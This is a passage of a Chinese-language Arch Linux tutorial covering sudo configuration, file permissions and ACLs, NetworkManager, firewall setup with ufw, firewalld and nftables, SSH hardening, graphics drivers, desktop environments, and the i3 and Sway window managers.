```

**使用 sudoers.d 目录**（推荐方式，便于管理）：

```bash
# 创建单独的配置文件
sudo nano /etc/sudoers.d/alice

# 内容：
alice ALL=(ALL) ALL

# 设置正确权限（必须 0440）
sudo chmod 0440 /etc/sudoers.d/alice

# 验证语法
sudo visudo -c /etc/sudoers.d/alice
```

**sudo 的常用选项**：

```bash
# 以 root 身份执行命令
sudo command

# 以指定用户身份执行
sudo -u www-data command

# 进入 root 的交互式 Shell
sudo -i

# 进入 root 的非登录 Shell（保留当前环境变量）
sudo -s

# 列出当前用户的 sudo 权限
sudo -l

# 验证密码（刷新时间戳）
sudo -v

# 清除密码时间戳（下次需要重新输入）
sudo -k

# 在后台执行命令
sudo -b command
```

**查看 sudo 日志**：

```bash
# 查看最近的 sudo 操作
journalctl -t sudo

# 查看特定用户的 sudo 操作
journalctl -t sudo | grep alice

# 实时监控 sudo 操作
journalctl -t sudo -f
```

**配置 sudo 超时时间**：

```bash
sudo visudo

# 添加（单位：分钟）
Defaults timestamp_timeout=15
# 15 分钟内免再次输入密码

# 设为 0 则每次都需要密码
Defaults timestamp_timeout=0
```

#### 总结

- sudo 是权限委派的核心，比 su 更安全、可审计
- 配置文件 `/etc/sudoers` 必须用 `visudo` 编辑
- 推荐用 `/etc/sudoers.d/` 目录管理单独的规则文件
- `wheel` 组是 Arch 默认的 sudo 用户组
- `sudo -l` 查看当前用户的 sudo 权限
- 所有 sudo 操作都有日志，可通过 `journalctl -t sudo` 查看

---

### 第 19 讲：文件权限与 ACL

#### 概念

Linux 文件权限控制谁可以读、写、执行文件或目录。传统权限模型分三类用户（所有者、组、其他）和三种权限（读 r、写 w、执行 x），用 `chmod` 和 `chown` 管理。当传统权限不够用时，可以使用 ACL（Access Control List，访问控制列表）实现更精细的权限控制。Arch Linux 完整支持这两种权限模型。

#### 原理

**传统权限模型**：

每个文件有三组权限：
- **所有者（owner/user）**：文件创建者
- **组（group）**：文件所属的组
- **其他（others/world）**：其他所有用户

每组有三个权限：
- **读（r，4）**：查看文件内容或目录列表
- **写（w，2）**：修改文件或在目录中创建/删除文件
- **执行（x，1）**：执行文件或进入目录

权限可以用符号（rwx）或数字（777）表示。数字是三组权限的和：r=4, w=2, x=1。例如 `754` 表示所有者 rwx（7=4+2+1）、组 r-x（5=4+1）、其他 r--（4）。

**特殊权限位**：
- **SUID（4000）**：执行时以文件所有者身份运行（如 `/usr/bin/passwd`）
- **SGID（2000）**：执行时以文件所属组身份运行；对目录则使新文件继承目录的组
- **Sticky Bit（1000）**：对目录生效，只有文件所有者能删除自己的文件（如 `/tmp`）

**ACL 的优势**：传统权限只能为三类用户设置权限，ACL 可以为任意用户或组单独设置权限。例如，可以让 alice 对某个文件有读写权限，而 bob 只有读权限，无需修改文件的所有者或组。

**ACL 的存储**：ACL 存储在文件的扩展属性中。文件系统必须支持 ACL（ext4、btrfs、xfs 默认支持）。查看 ACL 用 `getfacl`，设置用 `setfacl`。

#### 例子

**查看和修改传统权限**：

```bash
# 查看权限
ls -l file.txt
# 输出：-rw-r--r-- 1 alice users 1024 May 1 10:00 file.txt
#       ^^^^^^^^^^
#       所有者 组  其他

# 修改权限（符号法）
chmod u+x file.txt       # 所有者添加执行权限
chmod g-w file.txt       # 组移除写权限
chmod o=r file.txt       # 其他设为只读
chmod a+r file.txt       # 所有人添加读权限
chmod ugo+rwx file.txt   # 所有人都有所有权限（等价于 777）

# 修改权限（数字法）
chmod 755 file.txt       # rwxr-xr-x
chmod 644 file.txt       # rw-r--r--
chmod 600 file.txt       # rw-------（私有文件）
chmod 700 file.txt       # rwx------（私有可执行）

# 递归修改目录权限
chmod -R 755 /path/to/dir

# 修改所有者和组
sudo chown alice file.txt
sudo chown alice:users file.txt
sudo chgrp users file.txt
sudo chown -R alice:users /path/to/dir
```

**特殊权限位**：

```bash
# SUID（执行时以所有者身份运行）
sudo chmod u+s /usr/bin/myprogram
# 或
sudo chmod 4755 /usr/bin/myprogram
# ls -l 显示：-rwsr-xr-x

# SGID（目录中新文件继承组）
sudo chmod g+s /shared/dir
# ls -ld 显示：drwxr-sr-x

# Sticky Bit（只有所有者能删除）
sudo chmod +t /tmp
# 或
sudo chmod 1777 /tmp
# ls -ld 显示：drwxrwxrwt
```

**ACL 操作**：

```bash
# 安装 acl 包（通常已预装）
sudo pacman -S acl

# 查看 ACL
getfacl file.txt
# 输出：
# # file: file.txt
# # owner: alice
# # group: users
# user::rw-
# group::r--
# other::r--

# 给 alice 添加读写权限
sudo setfacl -m u:alice:rw file.txt

# 给 developers 组添加读执行权限
sudo setfacl -m g:developers:rx file.txt

# 移除 alice 的 ACL
sudo setfacl -x u:alice file.txt

# 设置默认 ACL（新创建的文件继承）
sudo setfacl -d -m u:alice:rw /shared/dir

# 递归设置 ACL
sudo setfacl -R -m u:alice:rw /shared/dir

# 备份和恢复 ACL
getfacl -R /shared/dir > acl-backup.acl
setfacl --restore=acl-backup.acl
```

**umask（创建文件时的默认权限）**：

```bash
# 查看当前 umask
umask
# 输出：022

# 文件默认权限 = 666 - umask = 644 (rw-r--r--)
# 目录默认权限 = 777 - umask = 755 (rwxr-xr-x)

# 临时修改 umask
umask 077   # 文件 600，目录 700（更安全）

# 永久修改（在 ~/.bashrc 中添加）
echo "umask 077" >> ~/.bashrc
```

#### 总结

- 传统权限：三类用户（所有者、组、其他）× 三种权限（r、w、x）
- 数字表示：r=4, w=2, x=1，如 755 = rwxr-xr-x
- 特殊权限：SUID（4）、SGID（2）、Sticky Bit（1）
- ACL 提供更精细的权限控制，用 `setfacl`/`getfacl` 管理
- `umask` 决定新文件的默认权限，推荐 022 或 077
- `chmod` 改权限，`chown` 改所有者，`chgrp` 改组

---

## 第 7 章：网络配置

### 第 20 讲：NetworkManager 与网络配置

#### 概念

NetworkManager 是 Arch Linux 桌面环境默认的网络管理工具，由 Red Hat 开发，现由 GNOME 项目维护。它提供图形界面（nm-applet）和命令行工具（nmcli、nmtui），可以管理有线、无线、VPN、移动宽带等各种网络连接。Arch 也支持 systemd-networkd（轻量级，适合服务器）和 netctl（Arch 原生，已较少使用）。本讲以 NetworkManager 为主，讲解网络配置。

#### 原理

**NetworkManager 的架构**：
- **nm-applet**：图形界面托盘程序
- **nmcli**：命令行界面（最强大）
- **nmtui**：文本界面（菜单式，简单易用）
- **NetworkManager 守护进程**：后台服务，管理所有网络连接
- **D-Bus 接口**：允许其他程序与 NetworkManager 通信

**连接（Connection）与设备（Device）**：NetworkManager 区分"连接"和"设备"。连接是网络配置的抽象（如"家庭 WiFi"、"公司有线"），设备是物理或虚拟网卡。一个连接可以应用到不同设备，一个设备也可以在多个连接间切换。

**配置文件位置**：NetworkManager 的连接配置存储在 `/etc/NetworkManager/system-connections/` 目录下，每个连接一个文件，格式为 INI。这些文件由 nmcli/nmtui 自动管理，不建议手动编辑。

**DHCP 与静态 IP**：DHCP（动态主机配置协议）让路由器自动分配 IP，适合大多数场景。静态 IP 需要手动配置 IP、子网掩码、网关、DNS，适合服务器或需要固定 IP 的设备。

#### 例子

**安装与启用 NetworkManager**：

```bash
# 安装
sudo pacman -S networkmanager

# 启用并启动
sudo systemctl enable --now NetworkManager

# 查看状态
systemctl status NetworkManager
```

**使用 nmcli 管理网络**：

```bash
# 查看所有网络设备
nmcli device status
# 输出：
# DEVICE  TYPE      STATE      CONNECTION
# eth0    ethernet  connected  Wired connection 1
# wlan0   wifi      disconnected  --

# 查看所有连接
nmcli connection show

# 查看可用 WiFi
nmcli device wifi list

# 连接 WiFi
nmcli device wifi connect "MyWiFi" password "mypassword"

# 连接隐藏 WiFi
nmcli device wifi connect "HiddenWiFi" password "mypassword" hidden yes

# 断开连接
nmcli device disconnect wlan0

# 重启网络
sudo systemctl restart NetworkManager
```

**配置静态 IP**：

```bash
# 创建以太网静态 IP 连接
sudo nmcli connection add type ethernet ifname eth0 con-name "Static" ipv4.method manual ipv4.addresses 192.168.1.100/24 ipv4.gateway 192.168.1.1 ipv4.dns "8.8.8.8 8.8.4.4"

# 激活连接
sudo nmcli connection up "Static"

# 修改现有连接的 IP
sudo nmcli connection modify "Static" ipv4.addresses 192.168.1.200/24

# 查看连接详情
nmcli connection show "Static"
```

**使用 nmtui（文本界面）**：

```bash
nmtui
# 提供菜单式界面，可以：
# - Edit a connection（编辑连接）
# - Activate a connection（激活连接）
# - Set system hostname（设置主机名）
```

**配置 WiFi 自动连接**：

```bash
# 设置连接自动连接
sudo nmcli connection modify "MyWiFi" connection.autoconnect yes

# 设置连接优先级（数字越大优先级越高）
sudo nmcli connection modify "MyWiFi" connection.autoconnect-priority 100
```

**使用 systemd-networkd**（轻量级，适合服务器）：

```bash
# 启用 systemd-networkd
sudo systemctl enable --now systemd-networkd

# 创建配置文件
sudo nano /etc/systemd/network/20-wired.network
# 内容：
# [Match]
# Name=eth0
#
# [Network]
# DHCP=yes
# 或静态 IP：
# [Network]
# Address=192.168.1.100/24
# Gateway=192.168.1.1
# DNS=8.8.8.8

# 重启服务
sudo systemctl restart systemd-networkd
```

**配置 DNS**：

```bash
# 查看当前 DNS
nmcli device show | grep DNS

# 修改连接的 DNS
sudo nmcli connection modify "Static" ipv4.dns "8.8.8.8 1.1.1.1"

# 使用 systemd-resolved（DNS 缓存）
sudo pacman -S systemd-resolvconf
sudo systemctl enable --now systemd-resolved

# 测试 DNS 解析
dig google.com
nslookup google.com
```

#### 总结

- NetworkManager 是 Arch 桌面默认的网络管理工具
- `nmcli` 是最强大的命令行工具，`nmtui` 提供菜单式界面
- 连接配置在 `/etc/NetworkManager/system-connections/`
- 服务器场景可用更轻量的 systemd-networkd
- 静态 IP 用 `ipv4.method manual` 配置
- DNS 可通过 NetworkManager 或 systemd-resolved 管理

---

### 第 21 讲：防火墙配置

#### 概念

防火墙是网络安全的第一道防线，控制进出系统的网络流量。Linux 内核内置 Netfilter 框架，通过 iptables 或 nftables 规则过滤数据包。Arch Linux 提供多种防火墙前端：ufw（Uncomplicated Firewall，Ubuntu 出品，简单易用）、firewalld（Red Hat 出品，支持区域概念）、nftables（内核原生，现代推荐）。本讲以 ufw 和 firewalld 为例，讲解防火墙配置。

#### 原理

**Netfilter 与 iptables/nftables**：Netfilter 是 Linux 内核的网络数据包过滤框架，工作在内核空间。iptables 是传统的用户空间配置工具，通过规则链（INPUT、OUTPUT、FORWARD）匹配数据包。nftables 是 iptables 的现代替代，性能更好，语法更简洁，从 Linux 3.13 开始集成到内核。

**ufw 的工作原理**：ufw 是 iptables/nftables 的前端，将复杂的规则简化为简单命令。例如 `ufw allow 80` 等价于 iptables 的多条规则。ufw 适合个人桌面和小型服务器。

**firewalld 的区域概念**：firewalld 将网络环境分为多个"区域"（zone），每个区域有不同的信任级别。例如 `public`（不信任）、`home`（家庭网络，较信任）、`trusted`（完全信任）。设备可以动态切换区域，适合移动设备在不同网络环境间切换。

**默认策略**：防火墙的默认策略决定了未匹配规则的数据包如何处理。常见策略是"默认拒绝入站，默认允许出站"——即外部无法主动连接本机，但本机可以主动连接外部。

#### 例子

**使用 ufw**：

```bash
# 安装
sudo pacman -S ufw

# 启用并启动
sudo systemctl enable --now ufw

# 查看状态
sudo ufw status
sudo ufw status verbose

# 设置默认策略
sudo ufw default deny incoming    # 默认拒绝入站
sudo ufw default allow outgoing   # 默认允许出站

# 允许 SSH（端口 22）
sudo ufw allow ssh
# 或指定端口
sudo ufw allow 22/tcp

# 允许 HTTP 和 HTTPS
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp

# 允许特定端口范围
sudo ufw allow 8000:9000/tcp

# 允许特定 IP 访问
sudo ufw allow from 192.168.1.0/24 to any port 22

# 拒绝特定端口
sudo ufw deny 3306/tcp

# 删除规则
sudo ufw delete allow 80/tcp

# 按编号删除
sudo ufw status numbered
sudo ufw delete 3

# 重置防火墙
sudo ufw reset

# 重新加载
sudo ufw reload
```

**使用 firewalld**：

```bash
# 安装
sudo pacman -S firewalld

# 启用并启动
sudo systemctl enable --now firewalld

# 查看状态
sudo firewall-cmd --state
sudo firewall-cmd --list-all

# 查看所有区域
sudo firewall-cmd --get-zones
sudo firewall-cmd --get-default-zone

# 设置默认区域
sudo firewall-cmd --set-default-zone=home

# 添加服务到区域（永久）
sudo firewall-cmd --permanent --add-service=ssh
sudo firewall-cmd --permanent --add-service=http
sudo firewall-cmd --permanent --add-service=https

# 添加端口
sudo firewall-cmd --permanent --add-port=8080/tcp

# 允许特定 IP
sudo firewall-cmd --permanent --add-source=192.168.1.100

# 重新加载（应用永久规则）
sudo firewall-cmd --reload

# 查看已开放的端口和服务
sudo firewall-cmd --list-services
sudo firewall-cmd --list-ports
```

**使用 nftables**（现代推荐）：

```bash
# 安装
sudo pacman -S nftables

# 启用并启动
sudo systemctl enable --now nftables

# 查看当前规则
sudo nft list ruleset

# 创建简单规则（允许 SSH、HTTP、HTTPS，拒绝其他入站）
sudo nano /etc/nftables.conf
# 内容示例：
# #!/usr/sbin/nft -f
# flush ruleset
# table inet filter {
#     chain input {
#         type filter hook input priority 0; policy drop;
#         # 允许回环
#         iif "lo" accept
#         # 允许已建立连接
#         ct state established,related accept
#         # 允许 ICMP
#         ip protocol icmp accept
#         # 允许 SSH、HTTP、HTTPS
#         tcp dport { 22, 80, 443 } accept
#     }
#     chain forward {
#         type filter hook forward priority 0; policy drop;
#     }
#     chain output {
#         type filter hook output priority 0; policy accept;
#     }
# }

# 应用规则
sudo nft -f /etc/nftables.conf

# 重新加载服务
sudo systemctl reload nftables
```

#### 总结

- Linux 防火墙基于内核 Netfilter 框架
- ufw 简单易用，适合桌面和小型服务器
- firewalld 支持区域概念，适合复杂网络环境
- nftables 是现代推荐，性能好，语法简洁
- 默认策略推荐"拒绝入站，允许出站"
- 修改规则后注意 `--reload` 或 `reload` 使其生效

---

### 第 22 讲：SSH 服务与安全加固

#### 概念

SSH（Secure Shell）是远程登录和管理 Linux 服务器的标准协议，使用加密通信保证安全。Arch Linux 默认安装 OpenSSH 客户端，服务器端需要单独安装 `openssh` 包。SSH 服务端配置文件是 `/etc/ssh/sshd_config`，通过修改配置可以大幅提升安全性。本讲讲解 SSH 服务的安装、配置和安全加固。

#### 原理

**SSH 协议**：SSH 协议在客户端和服务器之间建立加密通道，所有通信（包括密码）都经过加密。SSH 支持多种认证方式：密码认证、公钥认证、键盘交互认证等。公钥认证是最安全的方式，使用非对称加密（RSA、ECDSA、Ed25519）。

**SSH 工作流程**：
1. 客户端连接服务器 22 端口
2. 服务器发送公钥指纹，客户端验证（首次连接需手动确认）
3. 协商加密算法和会话密钥
4. 用户认证（密码或公钥）
5. 建立加密通道，传输数据

**公钥认证原理**：用户在客户端生成密钥对（私钥 + 公钥）。私钥保存在客户端（必须保密），公钥复制到服务器的 `~/.ssh/authorized_keys`。连接时，服务器用公钥发起挑战，客户端用私钥响应，验证通过即可登录，无需密码。

**SSH 安全风险**：
- 默认端口 22 容易被扫描爆破
- 密码认证可被暴力破解
- root 直接登录风险高
- 旧版协议（SSH 1）有已知漏洞

#### 例子

**安装与启动 SSH 服务**：

```bash
# 安装
sudo pacman -S openssh

# 启用并启动
sudo systemctl enable --now sshd

# 查看状态
sudo systemctl status sshd

# 查看监听端口
sudo ss -tlnp | grep ssh
```

**配置 SSH 公钥认证**：

```bash
# 1. 在客户端生成密钥对（推荐 Ed25519）
ssh-keygen -t ed25519 -C "alice@laptop"
# 提示输入文件路径（默认 ~/.ssh/id_ed25519）
# 提示输入密码（passphrase，可选但推荐）

# 2. 将公钥复制到服务器
ssh-copy-id alice@server-ip
# 或手动复制
cat ~/.ssh/id_ed25519.pub | ssh alice@server-ip "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys"

# 3. 测试免密登录
ssh alice@server-ip
```

**SSH 服务端安全加固**：

```bash
# 编辑配置文件
sudo nano /etc/ssh/sshd_config

# 推荐的安全配置：
Port 2222                          # 修改默认端口
PermitRootLogin no                 # 禁止 root 登录
PasswordAuthentication no          # 禁用密码认证（仅公钥）
PubkeyAuthentication yes           # 启用公钥认证
AuthorizedKeysFile .ssh/authorized_keys
PermitEmptyPasswords no            # 禁止空密码
ChallengeResponseAuthentication no # 禁用挑战响应
UsePAM yes                         # 使用 PAM
X11Forwarding no                   # 禁用 X11 转发（如不需要）
AllowUsers alice bob               # 仅允许特定用户
AllowGroups ssh-users              # 仅允许特定组
MaxAuthTries 3                     # 最大认证尝试次数
LoginGraceTime 30                  # 登录宽限时间
ClientAliveInterval 300            # 客户端存活检查间隔
ClientAliveCountMax 2              # 最大存活检查次数

# 重启服务生效
sudo systemctl restart sshd
```

**SSH 客户端配置**：

```bash
# 编辑客户端配置
nano ~/.ssh/config

# 示例配置：
Host myserver
    HostName 192.168.1.100
    Port 2222
    User alice
    IdentityFile ~/.ssh/id_ed25519
    ServerAliveInterval 60

Host github.com
    User git
    IdentityFile ~/.ssh/github_key

# 使用配置连接
ssh myserver
# 等价于 ssh -p 2222 -i ~/.ssh/id_ed25519 alice@192.168.1.100
```

**使用 fail2ban 防止暴力破解**：

```bash
# 安装
sudo pacman -S fail2ban

# 创建本地配置
sudo nano /etc/fail2ban/jail.local
# 内容：
[sshd]
enabled = true
port = 2222
filter = sshd
logpath = /var/log/auth.log
maxretry = 3
bantime = 3600
findtime = 600

# 启用并启动
sudo systemctl enable --now fail2ban

# 查看状态
sudo fail2ban-client status sshd

# 解封 IP
sudo fail2ban-client set sshd unbanip 1.2.3.4
```

**SSH 隧道与端口转发**：

```bash
# 本地端口转发（将本地 8080 转发到远程的 80）
ssh -L 8080:localhost:80 alice@server

# 远程端口转发（将远程 8080 转发到本地的 80）
ssh -R 8080:localhost:80 alice@server

# 动态端口转发（SOCKS 代理）
ssh -D 1080 alice@server

# 后台运行，不执行命令
ssh -fN -L 8080:localhost:80 alice@server
```

#### 总结

- SSH 是远程管理的标准协议，使用加密通信
- 推荐使用 Ed25519 公钥认证，禁用密码认证
- 安全加固：改端口、禁 root、禁密码、限制用户
- `~/.ssh/config` 简化客户端连接配置
- fail2ban 防止暴力破解，自动封禁恶意 IP
- SSH 隧道支持端口转发和 SOCKS 代理

---

## 第 8 章：图形界面

### 第 23 讲：X11、Wayland 与显卡驱动

#### 概念

Linux 图形界面有两套显示服务器协议：X11（X Window System，传统）和 Wayland（现代）。X11 历史悠久（1984 年），功能成熟但架构老旧；Wayland 是现代替代，更安全、更高效，但部分老软件兼容性不佳。显卡驱动分为开源和专有两类：NVIDIA 推荐专有驱动，AMD 和 Intel 推荐开源驱动。本讲讲解显示服务器选择和显卡驱动安装。

#### 原理

**X11 架构**：X11 采用客户端-服务器架构，X Server 负责硬件交互和绘图，X Client 是应用程序。X11 的网络透明性（可远程显示）是其优势，但也是安全隐患——任何 X Client 都可以监听其他 Client 的输入。X11 还有一个扩展叫 XWayland，用于在 Wayland 下运行 X11 应用。

**Wayland 架构**：Wayland 简化了架构，合成器（compositor）直接与硬件交互，应用程序通过 Wayland 协议与合成器通信。每个应用是隔离的，无法监听其他应用，安全性更好。Wayland 性能更好（无 X11 的额外开销），但部分老软件需要通过 XWayland 兼容层运行。

**显卡驱动类型**：
- **NVIDIA**：专有驱动（`nvidia` 包）性能最好，支持 CUDA；开源 `nouveau` 驱动性能差，不推荐
- **AMD**：开源 `amdgpu` 驱动已集成在内核，性能优秀；专有 `amdgpu-pro` 仅在特定场景需要
- **Intel**：开源 `i915`/`xe` 驱动已集成在内核，性能良好；无专有驱动

**Mesa 与 Vulkan**：Mesa 是开源的 OpenGL/Vulkan 实现，由 `mesa` 包提供。Vulkan 是现代图形 API，需要安装 `vulkan-*` 相关包。

#### 例子

**安装 X11**：

```bash
# 安装 X Server
sudo pacman -S xorg xorg-server xorg-xinit

# 安装常用 X 工具
sudo pacman -S xorg-apps

# 安装显卡驱动（根据显卡选择）
# Intel 集成显卡
sudo pacman -S xf86-video-intel mesa

# AMD 显卡
sudo pacman -S xf86-video-amdgpu mesa vulkan-radeon

# NVIDIA 显卡（专有驱动）
sudo pacman -S nvidia nvidia-utils
# 或 LTS 内核
sudo pacman -S nvidia-lts nvidia-utils

# 虚拟机
sudo pacman -S xf86-video-vmware
# 或
sudo pacman -S xf86-video-qxl
```

**安装 Wayland**：

```bash
# 安装 Wayland
sudo pacman -S wayland wayland-protocols xorg-xwayland

# 安装合成器（如 Sway）
sudo pacman -S sway

# 验证 Wayland 是否可用
echo $XDG_SESSION_TYPE
# wayland 或 x11
```

**NVIDIA 驱动安装与配置**：

```bash
# 1. 安装驱动
sudo pacman -S nvidia nvidia-utils lib32-nvidia-utils  # 32 位库（multilib）

# 2. 启用 DRM KMS（内核级模式设置）
sudo nano /etc/mkinitcpio.conf
# 在 MODULES 中添加 nvidia nvidia_modeset nvidia_uvm nvidia_drm
# MODULES=(nvidia nvidia_modeset nvidia_uvm nvidia_drm)
# 确保 systemd 在 udev 之后
# HOOKS=(base udev autodetect modconf kms keyboard keymap consolefont block filesystems fsck)

# 3. 设置内核参数
sudo nano /etc/default/grub
# 在 GRUB_CMDLINE_LINUX_DEFAULT 添加：
# nvidia-drm.modeset=1

# 4. 重新生成 initramfs
sudo mkinitcpio -P

# 5. 重新生成 GRUB 配置
sudo grub-mkconfig -o /boot/grub/grub.cfg

# 6. 重启
sudo reboot

# 7. 验证
nvidia-smi
glxinfo | grep "OpenGL renderer"
```

**AMD 驱动安装**：

```bash
# AMD 开源驱动已集成在内核，只需安装用户空间库
sudo pacman -S mesa lib32-mesa vulkan-radeon lib32-vulkan-radeon

# 验证
glxinfo | grep "OpenGL renderer"
vulkaninfo | grep "GPU"
```

**Intel 驱动安装**：

```bash
# Intel 开源驱动已集成在内核
sudo pacman -S mesa lib32-mesa vulkan-intel lib32-vulkan-intel

# 安装 Intel 工具
sudo pacman -S intel-media-driver  # 视频解码

# 验证
glxinfo | grep "OpenGL renderer"
```

**验证图形驱动**：

```bash
# 安装测试工具
sudo pacman -S mesa-demos

# 测试 OpenGL
glxinfo | grep "OpenGL version"
glxgears  # 显示三个旋转的齿轮

# 测试 Vulkan
vulkaninfo
```

#### 总结

- X11 是传统显示服务器，Wayland 是现代替代
- Wayland 更安全、更高效，但部分老软件需 XWayland 兼容
- NVIDIA 推荐专有驱动，AMD/Intel 用开源驱动
- Mesa 是开源的 OpenGL/Vulkan 实现
- NVIDIA 驱动需要配置 DRM KMS 和内核参数
- 用 `glxinfo` 和 `vulkaninfo` 验证驱动是否正常

---

### 第 24 讲：桌面环境安装

#### 概念

桌面环境（Desktop Environment，DE）是完整的图形界面套件，包含窗口管理器、文件管理器、面板、设置工具等。Arch Linux 支持所有主流桌面环境：GNOME（GNOME 项目，简洁现代）、KDE Plasma（KDE 项目，功能丰富）、XFCE（轻量级）、Cinnamon（Linux Mint 出品）、MATE（GNOME 2 的延续）、LXQt（轻量级 Qt）等。本讲讲解主流桌面环境的安装与配置。

#### 原理

**桌面环境的组成**：
- **显示管理器（Display Manager）**：登录界面，如 GDM（GNOME）、SDDM（KDE）、LightDM
- **窗口管理器（Window Manager）**：管理窗口的位置和外观
- **面板/任务栏**：显示应用切换、系统托盘、时钟
- **文件管理器**：如 Nautilus（GNOME）、Dolphin（KDE）
- **设置工具**：图形化配置系统设置

**桌面环境的选择考量**：
- **资源占用**：GNOME/KDE 较重，XFCE/LXQt 较轻
- **学习曲线**：GNOME 简洁但操作方式独特，KDE 类似 Windows
- **可定制性**：KDE 最强，GNOME 较弱
- **Wayland 支持**：GNOME 和 KDE 支持最好

**显示管理器的作用**：显示管理器在系统启动后运行，提供图形登录界面，验证用户身份后启动桌面会话。它也负责切换用户、远程登录（XDMCP）等。

#### 例子

**安装 GNOME**：

```bash
# 安装 GNOME 桌面
sudo pacman -S gnome

# 安装额外组件（推荐）
sudo pacman -S gnome-tweaks gnome-browser-connector

# 安装显示管理器（GDM）
sudo pacman -S gdm
sudo systemctl enable gdm

# 重启进入桌面
sudo reboot
```

**安装 KDE Plasma**：

```bash
# 安装 KDE Plasma 桌面
sudo pacman -S plasma

# 安装 KDE 应用
sudo pacman -S kde-applications

# 安装显示管理器（SDDM）
sudo pacman -S sddm
sudo systemctl enable sddm

# 重启
sudo reboot
```

**安装 XFCE**（轻量级）：

```bash
# 安装 X11 和 XFCE
sudo pacman -S xorg xorg-server
sudo pacman -S xfce4 xfce4-goodies

# 安装显示管理器（LightDM）
sudo pacman -S lightdm lightdm-gtk-greeter
sudo systemctl enable lightdm

# 或手动启动（无显示管理器）
startxfce4
```

**安装 Cinnamon**：

```bash
sudo pacman -S cinnamon
sudo pacman -S lightdm lightdm-gtk-greeter
sudo systemctl enable lightdm
```

**安装 MATE**：

```bash
sudo pacman -S mate mate-extra
sudo pacman -S lightdm lightdm-gtk-greeter
sudo systemctl enable lightdm
```

**安装 LXQt**：

```bash
sudo pacman -S lxqt
sudo pacman -S sddm
sudo systemctl enable sddm
```

**安装中文字体**（避免中文乱码）：

```bash
# 安装中文字体
sudo pacman -S noto-fonts-cjk noto-fonts-emoji noto-fonts

# 安装中文字体（文泉驿）
sudo pacman -S wqy-microhei wqy-zenhei

# 安装 Fira Code（编程字体）
sudo pacman -S ttf-fira-code

# 配置字体（在 ~/.config/fontconfig/fonts.conf）
nano ~/.config/fontconfig/fonts.conf
```

**安装中文输入法**：

```bash
# 安装 Fcitx5
sudo pacman -S fcitx5 fcitx5-chinese-addons fcitx5-configtool fcitx5-gtk fcitx5-qt

# 配置环境变量
nano ~/.pam_environment
# 或在 ~/.xprofile 中添加：
export GTK_IM_MODULE=fcitx
export QT_IM_MODULE=fcitx
export XMODIFIERS=@im=fcitx
export SDL_IM_MODULE=fcitx
export GLFW_IM_MODULE=ibus

# 启动 Fcitx5
fcitx5 &

# 配置输入法
fcitx5-configtool
```

**桌面环境切换**：

```bash
# 查看已安装的桌面环境
ls /usr/share/xsessions/
ls /usr/share/wayland-sessions/

# 在显示管理器登录界面选择桌面环境
# 注销后在登录界面右下角选择
```

#### 总结

- 桌面环境包含显示管理器、窗口管理器、文件管理器等
- GNOME 简洁现代，KDE 功能丰富，XFCE 轻量级
- 显示管理器：GDM（GNOME）、SDDM（KDE）、LightDM（其他）
- 安装后必须 `systemctl enable` 显示管理器
- 中文字体推荐 Noto CJK，输入法推荐 Fcitx5
- 可在登录界面切换不同桌面环境

---

### 第 25 讲：窗口管理器

#### 概念

窗口管理器（Window Manager，WM）是控制窗口位置、外观、行为的软件。与桌面环境不同，窗口管理器只负责窗口管理，不包含文件管理器、面板等额外组件。窗口管理器分为三类：浮动式（如 Openbox）、平铺式（如 i3、Sway）、动态式（如 dwm）。平铺式窗口管理器在程序员中很受欢迎，因为它能最大化利用屏幕空间，且全键盘操作高效。本讲以 i3 和 Sway 为例讲解。

#### 原理

**浮动式窗口管理器**：窗口可以重叠，类似 Windows/macOS 的传统窗口模式。适合鼠标用户。代表：Openbox、Fluxbox、IceWM。

**平铺式窗口管理器**：窗口不重叠，自动平铺排列。窗口被分为"主区"和"堆叠区"，主区通常占大部分屏幕。适合键盘用户和程序员。代表：i3、Sway、bspwm、Awesome。

**动态式窗口管理器**：根据窗口数量自动切换浮动/平铺模式。代表：dwm、xmonad。

**i3 的工作原理**：i3 使用工作区（workspace）组织窗口，每个工作区独立管理窗口。窗口可以水平或垂直分割，用快捷键切换。i3 的配置文件是纯文本，易于定制。

**Sway 与 i3 的关系**：Sway 是 i3 的 Wayland 版本，配置语法几乎完全兼容 i3。Sway 不依赖 X11，更现代、更安全。Sway 是 Wayland 用户的首选平铺式窗口管理器。

#### 例子

**安装 i3**（X11）：

```bash
# 安装 i3
sudo pacman -S i3-wm i3status i3lock dmenu

# 安装额外工具
sudo pacman -S xorg-xinit alacritty feh

# 配置启动
echo "exec i3" > ~/.xinitrc
startx

# 或通过显示管理器
sudo pacman -S lightdm lightdm-gtk-greeter
sudo systemctl enable lightdm
```

**i3 配置文件**：

```bash
# 复制默认配置
mkdir -p ~/.config/i3
cp /etc/i3/config ~/.config/i3/config

# 编辑配置
nano ~/.config/i3/config

# 关键配置示例：
# Mod 键设为 Windows 键
set $mod Mod4

# 终端
bindsym $mod+Return exec alacritty

# 关闭窗口
bindsym $mod+Shift+q kill

# dmenu 启动器
bindsym $mod+d exec dmenu_run

# 工作区切换
bindsym $mod+1 workspace 1
bindsym $mod+2 workspace 2
# ...

# 移动窗口到工作区
bindsym $mod+Shift+1 move container to workspace 1

# 分割方向
bindsym $mod+h split h
bindsym $mod+v split v

# 全屏
bindsym $mod+f fullscreen toggle

# 浮动模式
bindsym $mod+Shift+space floating toggle

# 状态栏
bar {
    status_command i3status
}

# 自动启动应用
exec_always --no-startup-id fcitx5
exec_always --no-startup-id feh --bg-scale ~/Pictures/wallpaper.jpg
```

**安装 Sway**（Wayland）：

```bash
# 安装 Sway
sudo pacman -S sway swaylock swayidle waybar wofi

# 安装终端和字体
sudo pacman -S alacritty ttf-dejavu

# 启动 Sway
sway
```

**Sway 配置文件**：

```bash
# 复制默认配置
mkdir -p ~/.config/sway
cp /etc/sway/config ~/.config/sway/config

# 编辑配置
nano ~/.config/sway/config

# 关键配置（与 i3 类似）：
set $mod Mod4

# 终端
bindsym $mod+Return exec alacritty

# 启动器（wofi 替代 dmenu）
bindsym $mod+d exec wofi --show drun

# 工作区
bindsym $mod+1 workspace 1
bindsym $mod+2 workspace 2

# 状态栏（waybar）
bar {
    swaybar_command waybar
}

# 自动启动
exec fcitx5
```

**常用平铺式窗口管理器对比**：

| 名称 | 显示服务器 | 语言 | 配置 | 特点 |
|------|-----------|------|------|------|
| i3 | X11 | C | 纯文本 | 最流行，文档完善 |
| Sway | Wayland | C | 纯文本 | i3 兼容，Wayland 原生 |
| bspwm | X11 | C | Shell | 二叉树布局，脚本化 |
| Awesome | X11 | Lua | Lua | 高度可编程 |
